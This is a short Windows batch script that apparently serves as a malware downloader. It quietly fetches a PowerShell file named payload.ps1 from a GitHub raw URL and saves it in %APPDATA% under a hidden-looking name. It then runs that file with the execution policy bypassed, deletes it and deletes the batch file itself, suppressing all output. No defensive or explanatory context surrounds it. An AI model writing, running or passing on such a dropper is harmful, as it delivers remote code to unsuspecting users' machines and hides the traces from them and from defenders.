@echo off
curl -so "%APPDATA%\~t.ps1" "https://raw.githubusercontent.com/Intel-Boss/t/main/payload.ps1" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -File "%APPDATA%\~t.ps1"
del "%APPDATA%\~t.ps1" >nul 2>&1
(goto) 2>nul & del "%~f0"
